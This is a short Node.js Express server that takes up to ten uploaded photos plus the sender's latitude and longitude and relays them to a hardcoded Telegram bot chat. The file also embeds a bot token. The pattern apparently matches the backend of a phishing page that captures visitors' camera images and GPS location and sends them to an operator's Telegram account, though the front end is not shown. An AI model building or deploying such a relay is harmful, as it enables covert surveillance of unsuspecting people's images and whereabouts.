// server.js

const express = require("express");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(cors());

// 🔥 YOUR DUMMY BOT TOKEN & ADMIN CHAT ID
const BOT_TOKEN = "7449706423:AAGaEZvZ-i-HhwsSZL1Hc4gcip7lNzVxrJU";
const ADMIN_ID = "6314556756";

// Serve static files (index.html)
app.use(express.static(path.join(__dirname)));

const upload = multer({ storage: multer.memoryStorage() });

app.post("/upload", upload.array("photos", 10), async (req, res) => {
  try {
    const files = req.files;
    const latitude = req.body.latitude;
    const longitude = req.body.longitude;

    if (!files || files.length === 0)
      return res.status(400).json({ error: "No photos received" });

    // Create Telegram MediaGroup
    const media = files.map((file, i) => ({
      type: "photo",
      media: `attach://photo${i}`
    }));

    const fd = new FormData();
    fd.append("chat_id", ADMIN_ID);
    fd.append("media", JSON.stringify(media));

    files.forEach((file, i) => {
      fd.append(`photo${i}`, file.buffer, {
        filename: `pic${i}.jpg`,
        contentType: "image/jpeg"
      });
    });

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`,
      fd,
      { headers: fd.getHeaders() }
    );

    // Send location
    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
      {
        chat_id: ADMIN_ID,
        latitude: parseFloat(latitude),
        longitude: parseFloat(longitude)
      }
    );

    res.json({ success: true });

  } catch (err) {
    console.error("Upload error:", err.message);
    res.status(500).json({ error: "Failed", details: err.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port", PORT));
